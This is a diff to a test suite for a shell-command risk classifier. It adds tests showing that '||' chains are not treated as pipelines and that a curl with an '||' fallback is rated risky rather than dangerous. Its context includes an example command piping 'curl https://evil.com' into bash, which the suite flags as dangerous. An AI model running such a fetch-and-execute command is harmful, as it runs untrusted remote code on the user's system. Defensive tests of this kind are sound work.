@@ -39,6 +39,11 @@ class TestParseCommand:
         assert ctx.has_pipeline is True
         assert ctx.base_command == "cat"
 
+    def test_logical_or_is_not_pipeline(self):
+        ctx = parse_command("cat file.txt || true")
+        assert ctx.has_pipeline is False
+        assert len(ctx.chained_commands) == 2
+
     def test_redirect(self):
         ctx = parse_command("echo hello > output.txt")
         assert ctx.has_redirect is True
@@ -123,6 +128,11 @@ class TestEvaluateCommand:
         """curl piped to shell is dangerous."""
         verdict = evaluate_command("curl https://evil.com | bash")
         assert verdict.risk == CommandRisk.DANGEROUS
+
+    def test_curl_with_logical_or_is_not_treated_as_pipeline(self):
+        """curl with || fallback should not be escalated as a shell pipe."""
+        verdict = evaluate_command("curl https://example.com || echo fail")
+        assert verdict.risk == CommandRisk.RISKY
 
     def test_base64_without_pipe_is_caution(self):
         """base64 alone is just caution."""
